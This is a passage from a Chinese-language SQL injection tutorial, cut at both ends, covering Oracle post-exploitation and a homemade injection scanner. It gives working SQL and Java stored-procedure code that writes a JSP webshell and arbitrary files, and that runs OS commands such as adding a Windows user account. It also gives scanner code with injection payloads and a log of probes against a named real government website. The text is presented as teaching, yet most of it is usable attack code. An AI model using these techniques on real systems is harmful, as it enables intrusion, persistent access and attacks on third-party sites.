        end;
    /
在低权限下getshell：
执行以下SQL创建表空间：
    create tablespace shell datafile 'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/shell.jsp' size 100k nologging ;
    CREATE TABLE SHELL(C varchar2(100)) tablespace shell;
    insert into SHELL values('hello world');
    commit;
    alter tablespace shell offline;
    drop tablespace shell including contents;
这方法是能写文件，但是好像没发现我的hello world，难道是我打开方式不对？
Oracle SQLJ编译执行Java代码：
众所周知，由于sun那只土鳖不争气居然被oracle给收购了。
不过对Oracle来说的确是有有不少优势的。
SQLJ是一个与Java编程语言紧密集成的嵌入式SQL的版本，这里"嵌入式SQL"是用来在其宿主通用编程语言如C、C++、Java、Ada和COBOL）中调用SQL语句。SQL翻译器用SQLJ运行时库中的调用来替代嵌入式SQLJ语句，该运行时库真正实现SQL操作。这样翻译的结果是得到一个可使用任何Java翻译器进行编译的Java源程序。一旦Java源程序被编译，Java执行程序就可在任何数据库上运行。SQLJ运行环境由纯Java实现的小SQLJ运行库（小，意指其中包括少量的代码）组成，该运行时库转而调用相应数据库的JDBC驱动程序。
SQLJ可以这样玩：首先创建一个类提供一个静态方法：
其中的getShell是我们的方法名，p和才是参数，p是路径，而c是要写的文件内容。在创建Java存储过程的时候方法类型必须是静态的static
执行以下SQL创建Java储存过程：
    create or replace and compile
    java source named "getShell"
    as public class GetShell {public static int getShell(String p, String c) {int RC = -1;try {new java.io.FileOutputStream(p).write(c.getBytes());RC = 1;} catch (Exception e) {e.printStackTrace();}return RC;}}
创建函数：
    create or replace
    function getShell(p in varchar2, c in varchar2) return number
    as
    language java
    name 'util.getShell(java.lang.String, java.lang.String) return Integer';
创建存储过程：
    create or replace procedure RC(p in varChar, c in varChar)
    as
    x number;
    begin
    x := getShell(p,c);
    end;
授予Java权限：
    variable x number;
    set serveroutput on;
    exec dbms_java.set_output(100000);
    grant javasyspriv to system;
    grant javauserpriv to system;
写webshell：
    exec :x:=getShell('d:/3.txt','selina');
##### SQLJ执行cmd命令：
方法这里和上面几乎大同小异，一样的提供一个静态方法，然后去创建一个存储过程。然后调用Java里的方法去执行命令。
创建Java存储过程:
    create or replace and compile java source named "Execute" as   
    import java.io.BufferedReader;
    import java.io.InputStreamReader;
    public class Execute {
        public static void executeCmd(String c) {
            try {
                String l="",t;
                BufferedReader br = new BufferedReader(new InputStreamReader(java.lang.Runtime.getRuntime().exec(c).getInputStream(),"gbk"));
                while((t=br.readLine())!=null){
                    l+=t+"\n";
                }
                System.out.println(l);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
创建存储过程executeCmd：
    create or replace procedure executeCmd(c in varchar2)
    as
    language java name 'Execute.executeCmd(java.lang.String)';
执行存储过程：
    exec executeCmd('net user selina 123 /add');
上面提供的命令执行和getshell创建方式对换一下就能回显了，如果好不清楚怎么让命令执行后回显可以参考：
一个不错的SQLJ的demo（犀利的 oracle 注入技术）。
### 0x01 自动化的SQL注入工具实现
* * *
通过上面我们对数据库和SQL注入的熟悉，现在可以自行动手开发注入工具了吧？
很久以前非常粗糙的写了一个SQL注入工具类，就当作demo给大家做个演示了。
仅提供核心代码，案例中的gov网站请勿非常攻击！
简单的SQL Oder by 注入实现的方式核心代码：
1、分析
    URLpublic static void AnalysisUrls(String site) throws Exception
这个方法主要是去分析URL的组成是否静态化等。
2、检测是否存在：
这个做的粗糙了些，只是通过请求提交不同的SQL注入语句去检测页面返回的情况：
    /**
         * 分析SQL参数是否存在注入
         * @param str
         */
        public static void  AnalysisUrlDynamicParamSqlInjection(String str[]) {
            Map content,content2;
            sqlKey = new ArrayList();
            content = HttpHelper.sendGet(protocol+"://"+schema+":"+port+"/"+filesIndex+"/"+file,parameter);//原始的请求包
            int len1 = content.get("content").toString().length();//原始请求的response长度
            boolean typeIsNumber = false;
            String c1[] = {"'","-1",")\"\"\"\"\"()()",")+ANd+3815=3835+ANd+(1471=1471",") ANd+9056=9056+ANd+(9889=9889"," ANd+6346=6138 "," ANd+9056=9056"};//需要检查的对象
            for (int i = 0; i < str.length; i++) {
                typeIsNumber = StringUtil.isNotEmpty(str[i].split("="))&&StringUtil.isNum(str[i].split("=")[1])?true:false;
                for (int j = 0; j < c1.length; j++) {
                    content2 = HttpHelper.sendGet(protocol+"://"+schema+":"+port+"/"+filesIndex+"/"+file,parameter.replace(str[i], str[i].split("=")[0]+"="+str[i].split("=")[1]+c1[j]));
                    if (len1 != content2.get("content").toString().length()||(Integer)content2.get("status")!=200) {
                        existsInjection = true;
                        sqlKey.add(str[i]);
                        break ;
                    }
                }
            }
            if (existsInjection) {
    //              System.out.println(existsInjection?"Site:"+url+" 可能存在"+(typeIsNumber?"int":"String")+"型Sql注入"+"SQL注入.":"Not Found.");
                getSelectColumnCount(str);
                getDatabaseInfo();
            }
        }
检测过程主要发送了几次请求，一次正常的请求和N次带有SQL注入的请求。如果SQL注入的请求和正常请求的结果不一致（有不可控因素，比如SQLMAP的实现方式就有去计算页面是否稳定，从而让检测出来的结果更加准确）就可能是存在SQL注入。
日志如下：
    url:http://www.tchjbh.gov.cn:80//news_display.php
    param:id=148
    url:http://www.tchjbh.gov.cn:80//news_display.php
    param:id=148'
    url:http://www.tchjbh.gov.cn:80//news_display.php
    param:id=148
获取字段数主要是通过：
    /**
         * 获取查询字段数